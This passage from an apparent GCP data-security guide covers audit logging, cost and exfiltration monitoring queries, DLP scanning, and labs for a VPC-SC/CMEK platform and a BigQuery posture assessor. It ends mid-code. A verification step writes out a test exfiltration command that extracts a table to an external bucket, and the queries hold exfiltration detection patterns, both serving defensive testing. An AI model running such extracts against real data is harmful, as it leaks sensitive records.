  destination = "bigquery.googleapis.com/projects/${var.project_id}/datasets/audit_logs"

  filter = <<-EOT
    logName:"cloudaudit.googleapis.com"
    AND (
      protoPayload.serviceName="bigquery.googleapis.com"
      OR protoPayload.serviceName="storage.googleapis.com"
      OR protoPayload.serviceName="pubsub.googleapis.com"
    )
  EOT

  unique_writer_identity = true

  bigquery_options {
    use_partitioned_tables = true
  }
}

# Grant the sink writer access to the dataset
resource "google_bigquery_dataset_iam_member" "audit_sink_writer" {
  dataset_id = "audit_logs"
  role       = "roles/bigquery.dataEditor"
  member     = google_logging_project_sink.audit_to_bq.writer_identity
}
```

### Cloud Monitoring for Data Services

```python
from google.cloud import monitoring_v3
from google.protobuf import duration_pb2


def create_bigquery_cost_alert(project_id: str, threshold_tb: float = 10.0):
    """Alert when BigQuery scans exceed threshold in 24h."""
    client = monitoring_v3.AlertPolicyServiceClient()
    project_name = f"projects/{project_id}"

    alert_policy = monitoring_v3.AlertPolicy(
        display_name="BigQuery High Data Scan Alert",
        conditions=[
            monitoring_v3.AlertPolicy.Condition(
                display_name="BigQuery bytes scanned > threshold",
                condition_threshold=monitoring_v3.AlertPolicy.Condition.MetricThreshold(
                    filter=(
                        'resource.type="bigquery_project" '
                        'AND metric.type="bigquery.googleapis.com/query/scanned_bytes"'
                    ),
                    aggregations=[
                        monitoring_v3.Aggregation(
                            alignment_period=duration_pb2.Duration(seconds=86400),
                            per_series_aligner=monitoring_v3.Aggregation.Aligner.ALIGN_SUM,
                        )
                    ],
                    comparison=monitoring_v3.ComparisonType.COMPARISON_GT,
                    threshold_value=threshold_tb * 1024**4,  # Convert TB to bytes
                    duration=duration_pb2.Duration(seconds=0),
                ),
            )
        ],
        notification_channels=[
            f"projects/{project_id}/notificationChannels/CHANNEL_ID"
        ],
        alert_strategy=monitoring_v3.AlertPolicy.AlertStrategy(
            auto_close=duration_pb2.Duration(seconds=86400),
        ),
    )

    created = client.create_alert_policy(
        name=project_name, alert_policy=alert_policy
    )
    return created.name


def create_slot_utilization_alert(project_id: str, threshold_pct: float = 85.0):
    """Alert when BigQuery slot utilization is consistently high."""
    client = monitoring_v3.AlertPolicyServiceClient()
    project_name = f"projects/{project_id}"

    alert_policy = monitoring_v3.AlertPolicy(
        display_name="BigQuery Slot Utilization High",
        conditions=[
            monitoring_v3.AlertPolicy.Condition(
                display_name="Slot utilization > 85% for 15min",
                condition_threshold=monitoring_v3.AlertPolicy.Condition.MetricThreshold(
                    filter=(
                        'resource.type="bigquery_project" '
                        'AND metric.type="bigquery.googleapis.com/slots/allocated_for_project"'
                    ),
                    aggregations=[
                        monitoring_v3.Aggregation(
                            alignment_period=duration_pb2.Duration(seconds=300),
                            per_series_aligner=monitoring_v3.Aggregation.Aligner.ALIGN_MEAN,
                        )
                    ],
                    comparison=monitoring_v3.ComparisonType.COMPARISON_GT,
                    threshold_value=threshold_pct,
                    duration=duration_pb2.Duration(seconds=900),  # 15 minutes
                ),
            )
        ],
        notification_channels=[
            f"projects/{project_id}/notificationChannels/CHANNEL_ID"
        ],
    )

    created = client.create_alert_policy(
        name=project_name, alert_policy=alert_policy
    )
    return created.name
```

### BigQuery INFORMATION_SCHEMA Monitoring

```sql
-- Query cost analysis: top expensive queries in last 7 days
SELECT
  user_email,
  job_id,
  query,
  total_bytes_processed / POW(1024, 4) AS tb_processed,
  total_slot_ms / 1000 / 3600 AS slot_hours,
  creation_time,
  TIMESTAMP_DIFF(end_time, start_time, SECOND) AS duration_seconds,
  destination_table.project_id AS dest_project,
  destination_table.dataset_id AS dest_dataset,
FROM `region-us`.INFORMATION_SCHEMA.JOBS_BY_PROJECT
WHERE
  creation_time > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)
  AND job_type = 'QUERY'
  AND state = 'DONE'
  AND error_result IS NULL
ORDER BY total_bytes_processed DESC
LIMIT 50;

-- Detect potential exfiltration: queries writing to external projects
SELECT
  user_email,
  job_id,
  creation_time,
  query,
  destination_table.project_id AS dest_project,
  destination_table.dataset_id AS dest_dataset,
  destination_table.table_id AS dest_table,
  total_bytes_processed,
FROM `region-us`.INFORMATION_SCHEMA.JOBS_BY_PROJECT
WHERE
  creation_time > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 24 HOUR)
  AND destination_table.project_id != @current_project
  AND total_bytes_processed > 1073741824  -- > 1 GB
ORDER BY creation_time DESC;

-- Reservation slot utilization
SELECT
  period_start,
  reservation_id,
  slot_ms / (TIMESTAMP_DIFF(period_start + INTERVAL 1 MINUTE, period_start, MILLISECOND)) AS avg_slots,
FROM `region-us`.INFORMATION_SCHEMA.JOBS_TIMELINE_BY_RESERVATION
WHERE
  period_start > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 1 HOUR)
GROUP BY 1, 2
ORDER BY 1 DESC;
```

### Security Command Center Integration

```hcl
# Organization-level SCC source for custom findings
resource "google_scc_source" "data_security" {
  display_name = "Data Platform Security Scanner"
  organization = var.org_id
  description  = "Custom findings from data platform security assessments"
}
```

```python
from google.cloud import securitycenter_v1
from google.protobuf import timestamp_pb2, struct_pb2
import datetime


def create_scc_finding(
    org_id: str,
    source_id: str,
    finding_id: str,
    category: str,
    resource_name: str,
    severity: str,
    description: str,
    properties: dict,
):
    """Create a custom SCC finding for data platform issues."""
    client = securitycenter_v1.SecurityCenterClient()
    source_name = f"organizations/{org_id}/sources/{source_id}"

    now = datetime.datetime.now(datetime.timezone.utc)
    event_time = timestamp_pb2.Timestamp()
    event_time.FromDatetime(now)

    # Convert properties to Struct
    source_properties = struct_pb2.Struct()
    source_properties.update(properties)

    finding = securitycenter_v1.Finding(
        state=securitycenter_v1.Finding.State.ACTIVE,
        resource_name=resource_name,
        category=category,
        event_time=event_time,
        severity=getattr(securitycenter_v1.Finding.Severity, severity),
        description=description,
        source_properties=source_properties,
        finding_class=securitycenter_v1.Finding.FindingClass.VULNERABILITY,
    )

    created = client.create_finding(
        parent=source_name,
        finding_id=finding_id,
        finding=finding,
    )
    return created.name


# Example: Report a publicly accessible BigQuery dataset
create_scc_finding(
    org_id="123456789",
    source_id="987654321",
    finding_id="bq-public-dataset-001",
    category="DATA_EXPOSURE",
    resource_name="//bigquery.googleapis.com/projects/prod/datasets/analytics",
    severity="CRITICAL",
    description="BigQuery dataset 'analytics' is accessible to allAuthenticatedUsers",
    properties={
        "dataset": "analytics",
        "exposed_entity": "allAuthenticatedUsers",
        "role_granted": "roles/bigquery.dataViewer",
        "table_count": "47",
        "estimated_rows": "2.3B",
        "contains_pii": "true",
    },
)
```

### DLP Integration with SIEM

```python
def export_dlp_findings_to_siem(project_id: str):
    """Export DLP findings to external SIEM via Pub/Sub."""
    from google.cloud import dlp_v2
    import json

    # DLP job triggers automatically publish to Pub/Sub
    # Configure inspection job with Pub/Sub action:
    dlp_client = dlp_v2.DlpServiceClient()

    # Create a job trigger for continuous scanning
    job_trigger = {
        "inspect_job": {
            "inspect_config": {
                "info_types": [
                    {"name": "CREDIT_CARD_NUMBER"},
                    {"name": "US_SOCIAL_SECURITY_NUMBER"},
                    {"name": "EMAIL_ADDRESS"},
                    {"name": "PHONE_NUMBER"},
                    {"name": "PERSON_NAME"},
                ],
                "min_likelihood": dlp_v2.Likelihood.LIKELY,
            },
            "storage_config": {
                "cloud_storage_options": {
                    "file_set": {
                        "url": f"gs://{project_id}-data-lake/**"
                    },
                    "file_types": [
                        dlp_v2.FileType.TEXT_FILE,
                        dlp_v2.FileType.CSV,
                        dlp_v2.FileType.JSON,
                    ],
                }
            },
            "actions": [
                {
                    "pub_sub": {
                        "topic": f"projects/{project_id}/topics/dlp-siem-export"
                    }
                },
                {
                    "save_findings": {
                        "output_config": {
                            "table": {
                                "project_id": project_id,
                                "dataset_id": "security_findings",
                                "table_id": "dlp_scan_results",
                            }
                        }
                    }
                },
            ],
        },
        "triggers": [
            {"schedule": {"recurrence_period_duration": "86400s"}}  # Daily
        ],
        "status": dlp_v2.JobTrigger.Status.HEALTHY,
    }

    created = dlp_client.create_job_trigger(
        request={
            "parent": f"projects/{project_id}/locations/global",
            "job_trigger": job_trigger,
            "trigger_id": "daily-pii-scan",
        }
    )
    return created.name
```

### Compliance Certifications

GCP data services maintain compliance with:

| Standard | Applicable Services | Key Requirements |
|----------|-------------------|------------------|
| SOC 2 Type II | All GCP services | Security, Availability, Confidentiality |
| ISO 27001 | All GCP services | Information security management |
| ISO 27701 | BigQuery, GCS, DLP | Privacy information management |
| PCI DSS Level 1 | BigQuery, GCS | Payment card data protection |
| HIPAA BAA | BigQuery, GCS, Dataflow | Protected health information |
| FedRAMP High | BigQuery, GCS (Assured Workloads) | US government workloads |
| GDPR | All GCP services (EU regions) | EU data protection |

**Assured Workloads** enforces compliance controls:

```hcl
resource "google_assured_workloads_workload" "fedramp_high" {
  compliance_regime = "FEDRAMP_HIGH"
  display_name      = "FedRAMP High Data Platform"
  location          = "us-central1"
  organization      = var.org_id

  resource_settings {
    resource_type = "CONSUMER_PROJECT"
  }

  labels = {
    classification = "fedramp-high"
    data_type      = "federal"
  }
}
```

---

## 10. Lab Exercises

### Lab 1: Secure Analytics Platform (BigQuery + VPC-SC + CMEK)

**Objective:** Build a production-ready analytics platform with defense-in-depth security.

**Prerequisites:**
- Organization-level access for VPC Service Controls
- KMS admin role for key creation
- Two GCP projects (data-platform, analytics-consumer)

```hcl
# main.tf — Secure Analytics Platform

variable "org_id" {
  description = "Organization ID"
  type        = string
}

variable "data_project_id" {
  description = "Data platform project"
  type        = string
}

variable "consumer_project_id" {
  description = "Analytics consumer project"
  type        = string
}

variable "access_policy_id" {
  description = "Access Context Manager policy ID"
  type        = string
}

# --- KMS Setup ---

resource "google_kms_key_ring" "analytics" {
  name     = "analytics-platform"
  location = "us-central1"
  project  = var.data_project_id
}

resource "google_kms_crypto_key" "bq_key" {
  name            = "bigquery-tables"
  key_ring        = google_kms_key_ring.analytics.id
  rotation_period = "7776000s"
  purpose         = "ENCRYPT_DECRYPT"

  version_template {
    algorithm        = "GOOGLE_SYMMETRIC_ENCRYPTION"
    protection_level = "HSM"
  }
}

resource "google_kms_crypto_key" "gcs_key" {
  name            = "cloud-storage"
  key_ring        = google_kms_key_ring.analytics.id
  rotation_period = "7776000s"
  purpose         = "ENCRYPT_DECRYPT"

  version_template {
    algorithm        = "GOOGLE_SYMMETRIC_ENCRYPTION"
    protection_level = "HSM"
  }
}

# --- Service Accounts ---

resource "google_service_account" "data_pipeline" {
  account_id   = "data-pipeline-worker"
  display_name = "Data Pipeline Worker"
  project      = var.data_project_id
}

resource "google_service_account" "analytics_reader" {
  account_id   = "analytics-reader"
  display_name = "Analytics Reader (Consumer)"
  project      = var.consumer_project_id
}

# --- BigQuery with CMEK ---

resource "google_bigquery_dataset" "raw" {
  dataset_id    = "raw_data"
  location      = "us-central1"
  project       = var.data_project_id

  default_encryption_configuration {
    kms_key_name = google_kms_crypto_key.bq_key.id
  }

  access {
    role          = "OWNER"
    special_group = "projectOwners"
  }

  access {
    role          = "WRITER"
    user_by_email = google_service_account.data_pipeline.email
  }

  labels = {
    sensitivity = "high"
    encryption  = "cmek-hsm"
  }
}

resource "google_bigquery_dataset" "curated" {
  dataset_id = "curated_analytics"
  location   = "us-central1"
  project    = var.data_project_id

  default_encryption_configuration {
    kms_key_name = google_kms_crypto_key.bq_key.id
  }

  access {
    role          = "OWNER"
    special_group = "projectOwners"
  }

  access {
    role          = "READER"
    user_by_email = google_service_account.analytics_reader.email
  }
}

# --- Cloud Storage with CMEK ---

resource "google_storage_bucket" "data_lake" {
  name     = "${var.data_project_id}-secure-lake"
  location = "US-CENTRAL1"
  project  = var.data_project_id

  uniform_bucket_level_access = true
  public_access_prevention    = "enforced"

  encryption {
    default_kms_key_name = google_kms_crypto_key.gcs_key.id
  }

  versioning {
    enabled = true
  }

  lifecycle_rule {
    action {
      type          = "SetStorageClass"
      storage_class = "NEARLINE"
    }
    condition {
      age = 30
    }
  }

  logging {
    log_bucket = "${var.data_project_id}-access-logs"
  }
}

# --- VPC Service Controls ---

resource "google_access_context_manager_service_perimeter" "analytics" {
  parent = "accessPolicies/${var.access_policy_id}"
  name   = "accessPolicies/${var.access_policy_id}/servicePerimeters/secure_analytics"
  title  = "Secure Analytics Perimeter"

  status {
    resources = [
      "projects/${data.google_project.data.number}",
      "projects/${data.google_project.consumer.number}",
    ]

    restricted_services = [
      "bigquery.googleapis.com",
      "storage.googleapis.com",
      "bigquerydatatransfer.googleapis.com",
    ]

    vpc_accessible_services {
      enable_restriction = true
      allowed_services   = ["RESTRICTED-SERVICES"]
    }

    # Block all egress except to approved projects
    egress_policies {
      egress_from {
        identity_type = "ANY_SERVICE_ACCOUNT"
      }
      egress_to {
        resources = ["projects/${data.google_project.consumer.number}"]
        operations {
          service_name = "bigquery.googleapis.com"
          method_selectors {
            method = "*"
          }
        }
      }
    }
  }
}

# --- Audit Logging ---

resource "google_project_iam_audit_config" "bq_full_audit" {
  project = var.data_project_id
  service = "bigquery.googleapis.com"

  audit_log_config {
    log_type = "ADMIN_READ"
  }
  audit_log_config {
    log_type = "DATA_READ"
  }
  audit_log_config {
    log_type = "DATA_WRITE"
  }
}

resource "google_project_iam_audit_config" "storage_full_audit" {
  project = var.data_project_id
  service = "storage.googleapis.com"

  audit_log_config {
    log_type = "DATA_READ"
  }
  audit_log_config {
    log_type = "DATA_WRITE"
  }
}

# --- Monitoring Alerts ---

resource "google_monitoring_alert_policy" "bq_export_alert" {
  display_name = "BigQuery Export to External Project"
  project      = var.data_project_id
  combiner     = "OR"

  conditions {
    display_name = "Export detected"
    condition_matched_log {
      filter = <<-EOT
        resource.type="bigquery_project"
        protoPayload.methodName="jobservice.jobcompleted"
        protoPayload.serviceData.jobCompletedEvent.job.jobConfiguration.extract.destinationUris:*
      EOT
    }
  }

  alert_strategy {
    notification_rate_limit {
      period = "300s"
    }
  }

  notification_channels = [var.security_channel_id]
}
```

**Verification commands:**

```bash
# Verify CMEK is applied
bq show --format=prettyjson project:raw_data | jq '.defaultEncryptionConfiguration'

# Verify VPC-SC perimeter
gcloud access-context-manager perimeters describe secure_analytics \
  --policy=${ACCESS_POLICY_ID} \
  --format=yaml

# Test exfiltration is blocked (should fail from outside perimeter)
bq extract project:curated_analytics.revenue \
  gs://external-bucket/exfil.csv
# Expected: VPC Service Controls violation

# Verify audit logs are flowing
gcloud logging read \
  'resource.type="bigquery_dataset" protoPayload.methodName="datasetservice.insert"' \
  --project=data-project \
  --limit=5
```

### Lab 2: DLP Scanning on Cloud Storage

**Objective:** Implement automated PII detection and remediation for data lake objects.

```python
#!/usr/bin/env python3
"""
Lab 2: DLP Scanning Pipeline for Cloud Storage
Scans new objects, classifies PII, and triggers remediation.
"""

from google.cloud import dlp_v2, storage, pubsub_v1
from google.cloud import functions_v2
import json
import os

PROJECT_ID = os.environ["GCP_PROJECT"]
DLP_RESULTS_DATASET = "dlp_results"
DLP_RESULTS_TABLE = "findings"
NOTIFICATION_TOPIC = f"projects/{PROJECT_ID}/topics/dlp-alerts"


def create_dlp_inspection_template():
    """Create a reusable DLP inspection template."""
    dlp = dlp_v2.DlpServiceClient()

    # Define comprehensive PII detection
    inspect_template = {
        "display_name": "Data Lake PII Scanner",
        "description": "Detects PII in data lake objects",
        "inspect_config": {
            "info_types": [
                {"name": "CREDIT_CARD_NUMBER"},
                {"name": "US_SOCIAL_SECURITY_NUMBER"},
                {"name": "US_INDIVIDUAL_TAXPAYER_IDENTIFICATION_NUMBER"},
                {"name": "EMAIL_ADDRESS"},
                {"name": "PHONE_NUMBER"},
                {"name": "PERSON_NAME"},
                {"name": "STREET_ADDRESS"},
                {"name": "DATE_OF_BIRTH"},
                {"name": "IP_ADDRESS"},
                {"name": "US_DRIVERS_LICENSE_NUMBER"},
                {"name": "US_PASSPORT"},
                {"name": "MEDICAL_RECORD_NUMBER"},
            ],
            "custom_info_types": [
                {
                    "info_type": {"name": "INTERNAL_CUSTOMER_ID"},
                    "regex": {"pattern": r"CUST-[A-Z]{2}\d{8}"},
                    "likelihood": dlp_v2.Likelihood.VERY_LIKELY,
                },
                {
                    "info_type": {"name": "INTERNAL_ACCOUNT_NUMBER"},
                    "regex": {"pattern": r"ACC-\d{12}"},
                    "likelihood": dlp_v2.Likelihood.VERY_LIKELY,
                },
            ],
            "min_likelihood": dlp_v2.Likelihood.POSSIBLE,
            "include_quote": False,
            "limits": {
                "max_findings_per_request": 3000,
                "max_findings_per_item": 500,
            },
            "rule_set": [
                {
                    "info_types": [{"name": "PERSON_NAME"}],
                    "rules": [
                        {
                            "exclusion_rule": {
                                "regex": {"pattern": r"^(test|demo|sample)"},
                                "matching_type": dlp_v2.MatchingType.MATCHING_TYPE_PARTIAL_MATCH,
                            }
                        }
                    ],
                }
            ],
        },
    }

    created = dlp.create_inspect_template(
        request={
            "parent": f"projects/{PROJECT_ID}/locations/global",
            "inspect_template": inspect_template,
            "template_id": "data-lake-pii-scanner",
        }
    )
    print(f"Created template: {created.name}")
    return created.name


def scan_gcs_object(bucket_name: str, object_name: str) -> dict:
    """Scan a single GCS object for PII."""
    dlp = dlp_v2.DlpServiceClient()

    job_config = {
        "inspect_config": {
            "info_types": [
                {"name": "CREDIT_CARD_NUMBER"},
                {"name": "US_SOCIAL_SECURITY_NUMBER"},
                {"name": "EMAIL_ADDRESS"},
                {"name": "PHONE_NUMBER"},
            ],
            "min_likelihood": dlp_v2.Likelihood.LIKELY,
        },
        "storage_config": {
            "cloud_storage_options": {
                "file_set": {
                    "url": f"gs://{bucket_name}/{object_name}"
                },
            }
        },
        "actions": [
            {
                "save_findings": {
                    "output_config": {
                        "table": {
                            "project_id": PROJECT_ID,
                            "dataset_id": DLP_RESULTS_DATASET,
                            "table_id": DLP_RESULTS_TABLE,
                        }
                    }
                }
            },
            {
                "pub_sub": {"topic": NOTIFICATION_TOPIC}
            },
        ],
    }

    response = dlp.create_dlp_job(
        request={
            "parent": f"projects/{PROJECT_ID}/locations/global",
            "inspect_job": job_config,
        }
    )

    return {"job_name": response.name, "state": response.state.name}


def handle_dlp_notification(event: dict, context) -> None:
    """Cloud Function triggered by DLP findings notification.

    Quarantines objects with HIGH/CRITICAL PII findings.
    """
    pubsub_message = json.loads(
        event["data"].decode("utf-8") if isinstance(event["data"], bytes)
        else event["data"]
    )

    job_name = pubsub_message.get("jobName")
    if not job_name:
        return

    dlp = dlp_v2.DlpServiceClient()
    job = dlp.get_dlp_job(request={"name": job_name})

    if job.state != dlp_v2.DlpJob.JobState.DONE:
        return

    result = job.inspect_details.result
    info_type_stats = result.info_type_stats

    # Classify severity based on findings
    critical_types = {"CREDIT_CARD_NUMBER", "US_SOCIAL_SECURITY_NUMBER"}
    high_types = {"EMAIL_ADDRESS", "PHONE_NUMBER", "DATE_OF_BIRTH"}

    has_critical = any(
        stat.info_type.name in critical_types
        for stat in info_type_stats
        if stat.count > 0
    )

    has_high = any(
        stat.info_type.name in high_types
        for stat in info_type_stats
        if stat.count > 0
    )

    if has_critical:
        # Move to quarantine bucket
        quarantine_object(job)
        notify_security_team(job, severity="CRITICAL")
    elif has_high:
        # Tag for review
        tag_for_review(job)
        notify_data_owner(job, severity="HIGH")


def quarantine_object(job) -> None:
    """Move object with critical PII to quarantine bucket."""
    storage_client = storage.Client()
    # Extract source bucket/object from job config
    cloud_storage_options = (
        job.inspect_details.requested_options
        .job_config.storage_config.cloud_storage_options
    )
    source_url = cloud_storage_options.file_set.url
    # Parse gs://bucket/object
    parts = source_url.replace("gs://", "").split("/", 1)
    source_bucket_name = parts[0]
    source_object_name = parts[1]

    source_bucket = storage_client.bucket(source_bucket_name)
    quarantine_bucket = storage_client.bucket(f"{PROJECT_ID}-quarantine")

    # Copy to quarantine
    source_blob = source_bucket.blob(source_object_name)
    source_bucket.copy_blob(
        source_blob,
        quarantine_bucket,
        new_name=f"pii-critical/{source_object_name}",
    )

    # Delete original (after verifying copy)
    quarantine_blob = quarantine_bucket.blob(f"pii-critical/{source_object_name}")
    if quarantine_blob.exists():
        source_blob.delete()


# --- Deployment ---

def deploy_scanning_infrastructure():
    """Deploy the full DLP scanning pipeline."""
    commands = """
    # Create quarantine bucket
    gcloud storage buckets create gs://${PROJECT_ID}-quarantine \\
      --location=US-CENTRAL1 \\
      --uniform-bucket-level-access \\
      --public-access-prevention=enforced

    # Create Pub/Sub topic for DLP notifications
    gcloud pubsub topics create dlp-alerts

    # Create BigQuery dataset for DLP results
    bq mk --dataset \\
      --location=US \\
      --description="DLP scan results" \\
      ${PROJECT_ID}:dlp_results

    # Deploy Cloud Function for notification handling
    gcloud functions deploy handle-dlp-findings \\
      --runtime=python311 \\
      --trigger-topic=dlp-alerts \\
      --entry-point=handle_dlp_notification \\
      --service-account=dlp-handler@${PROJECT_ID}.iam.gserviceaccount.com \\
      --region=us-central1 \\
      --memory=256MB \\
      --timeout=120s \\
      --set-env-vars=GCP_PROJECT=${PROJECT_ID}

    # Create Eventarc trigger for new GCS objects
    gcloud eventarc triggers create new-object-dlp-scan \\
      --location=us-central1 \\
      --destination-run-service=dlp-scanner \\
      --destination-run-region=us-central1 \\
      --event-filters="type=google.cloud.storage.object.v1.finalized" \\
      --event-filters="bucket=${PROJECT_ID}-data-lake" \\
      --service-account=dlp-trigger@${PROJECT_ID}.iam.gserviceaccount.com
    """
    print(commands)
```

### Lab 3: BigQuery Security Posture Assessment (Authorized Pentest)

**Objective:** Conduct an authorized security assessment of a BigQuery environment, identifying misconfigurations and exploitation paths.

**Scope:** Authorized testing within own organization's GCP projects.

```python
#!/usr/bin/env python3
"""
Lab 3: BigQuery Security Posture Assessment
Authorized pentest methodology for BigQuery environments.

IMPORTANT: Only execute against environments where you have explicit
written authorization for security testing.
"""

from google.cloud import bigquery, asset_v1, iam_admin_v1
from google.cloud import resourcemanager_v3
from dataclasses import dataclass, field
from datetime import datetime, timezone
import json


@dataclass
class Finding:
    severity: str  # CRITICAL, HIGH, MEDIUM, LOW, INFO
    category: str
    title: str
    description: str
    resource: str
    evidence: str
    remediation: str
    cwe: str = ""
    cvss: float = 0.0
    timestamp: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )


class BigQuerySecurityAssessor:
    """Comprehensive BigQuery security assessment tool."""

    def __init__(self, project_id: str):
        self.project_id = project_id
        self.bq_client = bigquery.Client(project=project_id)
        self.findings: list[Finding] = []

    def run_full_assessment(self) -> list[Finding]:
        """Execute complete security assessment."""
        self.assess_dataset_permissions()
        self.assess_table_encryption()
        self.assess_query_patterns()
        self.assess_export_controls()
        self.assess_service_account_bindings()
        self.assess_audit_logging()
        self.assess_network_controls()
        self.assess_data_classification()
        return self.findings

    def assess_dataset_permissions(self):
        """Check for overly permissive dataset access."""
        datasets = list(self.bq_client.list_datasets())

        for dataset_listing in datasets:
            dataset = self.bq_client.get_dataset(dataset_listing.dataset_id)

            for entry in dataset.access_entries:
                # CRITICAL: Public access
                if entry.entity_id in ("allUsers", "allAuthenticatedUsers"):
                    self.findings.append(Finding(
                        severity="CRITICAL",
                        category="ACCESS_CONTROL",
                        title=f"Publicly accessible dataset: {dataset.dataset_id}",
                        description=(
                            f"Dataset {dataset.dataset_id} grants "
                            f"{entry.role} to {entry.entity_id}"
                        ),
                        resource=f"bigquery.googleapis.com/projects/{self.project_id}"
                                 f"/datasets/{dataset.dataset_id}",
                        evidence=f"entity_type={entry.entity_type}, "
                                 f"entity_id={entry.entity_id}, "
                                 f"role={entry.role}",
                        remediation=(
                            "Remove public access. Use IAM groups with "
                            "specific membership for data access."
                        ),
                        cwe="CWE-732",
                        cvss=9.1,
                    ))

                # HIGH: Domain-wide WRITER/OWNER access
                if entry.entity_type == "domain" and entry.role in (
                    "WRITER", "OWNER"
                ):
                    self.findings.append(Finding(
                        severity="HIGH",
                        category="ACCESS_CONTROL",
                        title=f"Domain-wide write access: {dataset.dataset_id}",
                        description=(
                            f"Entire domain {entry.entity_id} has "
                            f"{entry.role} on {dataset.dataset_id}"
                        ),
                        resource=f"bigquery.googleapis.com/projects/{self.project_id}"
                                 f"/datasets/{dataset.dataset_id}",
                        evidence=f"domain={entry.entity_id}, role={entry.role}",
                        remediation=(
                            "Replace domain-wide access with specific IAM "
                            "groups following least-privilege principle."
                        ),
                        cwe="CWE-269",
                        cvss=7.5,
                    ))

    def assess_table_encryption(self):
        """Verify CMEK encryption on sensitive tables."""
        datasets = list(self.bq_client.list_datasets())

        for dataset_listing in datasets:
            dataset = self.bq_client.get_dataset(dataset_listing.dataset_id)

            # Check dataset-level CMEK
            if not dataset.default_encryption_configuration:
                self.findings.append(Finding(
                    severity="MEDIUM",
                    category="ENCRYPTION",
                    title=f"No CMEK on dataset: {dataset.dataset_id}",
                    description=(
                        f"Dataset {dataset.dataset_id} uses Google-managed "
                        f"encryption. CMEK provides customer key control."
                    ),
                    resource=f"bigquery.googleapis.com/projects/{self.project_id}"
                             f"/datasets/{dataset.dataset_id}",
                    evidence="defaultEncryptionConfiguration is null",
                    remediation=(
                        "Configure CMEK with HSM-protected keys. "
                        "Apply org policy constraints/bigquery.requireCmek."
                    ),
                    cwe="CWE-311",
                    cvss=4.0,
                ))

    def assess_query_patterns(self):
        """Analyze recent queries for suspicious patterns."""
        query = """
        SELECT
          user_email,
          query,
          total_bytes_processed,
          destination_table,
          creation_time,
          CASE
            WHEN REGEXP_CONTAINS(query, r'(?i)EXPORT\\s+DATA') THEN 'EXPORT'
            WHEN REGEXP_CONTAINS(query, r'(?i)INTO\\s+') THEN 'CTAS'
            WHEN total_bytes_processed > 10737418240 THEN 'LARGE_SCAN'
            ELSE 'NORMAL'
          END AS query_risk_category
        FROM `region-us`.INFORMATION_SCHEMA.JOBS_BY_PROJECT
        WHERE
          creation_time > TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 7 DAY)
          AND job_type = 'QUERY'
          AND state = 'DONE'
          AND (
            REGEXP_CONTAINS(query, r'(?i)EXPORT\\s+DATA')
            OR REGEXP_CONTAINS(query, r'(?i)SELECT\\s+\\*')
            OR total_bytes_processed > 10737418240
          )
        ORDER BY total_bytes_processed DESC
        LIMIT 100
        """

        try:
            results = self.bq_client.query(query).result()
            for row in results:
                if row.query_risk_category == "EXPORT":
                    self.findings.append(Finding(
                        severity="HIGH",
                        category="DATA_EXFILTRATION",
                        title=f"EXPORT DATA used by {row.user_email}",
                        description=(
                            f"User {row.user_email} executed EXPORT DATA "
                            f"at {row.creation_time}"
                        ),
                        resource="bigquery.googleapis.com/jobs",
                        evidence=f"query_prefix={row.query[:200]}",
                        remediation=(
                            "Review if export was authorized. "
                            "Implement org policy to restrict export destinations."
                        ),
                        cwe="CWE-200",
                        cvss=7.0,
                    ))
        except Exception as e:
            self.findings.append(Finding(
                severity="INFO",
                category="ASSESSMENT",
                title="Unable to query INFORMATION_SCHEMA",
                description=str(e),
                resource="bigquery.googleapis.com/INFORMATION_SCHEMA",
                evidence=str(e),
                remediation="Ensure assessment SA has bigquery.jobs.list",
            ))

    def assess_export_controls(self):
        """Check if export restrictions are in place."""
        # Check org policy for export restrictions
        try:
            from google.cloud import orgpolicy_v2
            client = orgpolicy_v2.OrgPolicyClient()

            policy_name = (
                f"projects/{self.project_id}/policies/"
                "constraints/bigquery.restrictExportDataConfig"
            )
            try:
                policy = client.get_policy(request={"name": policy_name})
                # Policy exists — check if it's enforced
                if not policy.spec.rules:
                    self.findings.append(Finding(
                        severity="HIGH",
                        category="DATA_EXFILTRATION",
                        title="BigQuery export restriction not enforced",
                        description=(
                            "Org policy exists but has no enforcement rules"
                        ),
                        resource=policy_name,
                        evidence="spec.rules is empty",
                        remediation="Configure allowed export destinations",
                        cwe="CWE-284",
                        cvss=7.5,
                    ))
            except Exception:
                self.findings.append(Finding(
                    severity="HIGH",
                    category="DATA_EXFILTRATION",
                    title="No BigQuery export restriction policy",
                    description=(
                        "No org policy restricting EXPORT DATA destinations. "
                        "Any user with bigquery.jobs.create can export data "
                        "to any GCS bucket they can write to."
                    ),
                    resource=f"projects/{self.project_id}",
                    evidence="Policy not found",
                    remediation=(
                        "Create org policy "
                        "constraints/bigquery.restrictExportDataConfig"
                    ),
                    cwe="CWE-284",
                    cvss=7.5,
                ))
        except ImportError:
            pass

    def assess_service_account_bindings(self):
        """Identify service accounts with excessive BigQuery permissions."""
        from google.cloud import resourcemanager_v3

        rm_client = resourcemanager_v3.ProjectsClient()
        policy = rm_client.get_iam_policy(
            request={"resource": f"projects/{self.project_id}"}
        )

        dangerous_roles = {
            "roles/bigquery.admin",
            "roles/owner",
            "roles/editor",
        }

        for binding in policy.bindings:
            if binding.role in dangerous_roles:
                for member in binding.members:
                    if "serviceAccount" in member and "gserviceaccount.com" in member:
                        self.findings.append(Finding(
                            severity="HIGH",
                            category="PRIVILEGE_ESCALATION",
                            title=f"Privileged SA: {member}",
                            description=(
                                f"Service account {member} has {binding.role}. "
                                f"If keys exist, this enables full data access."
                            ),
                            resource=f"iam.googleapis.com/{member}",
                            evidence=f"role={binding.role}",
                            remediation=(
                                "Replace with least-privilege custom role. "
                                "Ensure no exported keys exist."
                            ),
                            cwe="CWE-269",
                            cvss=8.0,
                        ))

    def assess_audit_logging(self):
        """Verify Data Access audit logs are enabled."""
        from google.cloud import resourcemanager_v3

        rm_client = resourcemanager_v3.ProjectsClient()
        policy = rm_client.get_iam_policy(
            request={"resource": f"projects/{self.project_id}"}
        )

        # Check audit configs
        bq_audit_enabled = False
        for config in policy.audit_configs:
            if config.service == "bigquery.googleapis.com":
                log_types = [lc.log_type for lc in config.audit_log_configs]
                if 1 in log_types and 2 in log_types:  # DATA_READ and DATA_WRITE
                    bq_audit_enabled = True

        if not bq_audit_enabled:
            self.findings.append(Finding(
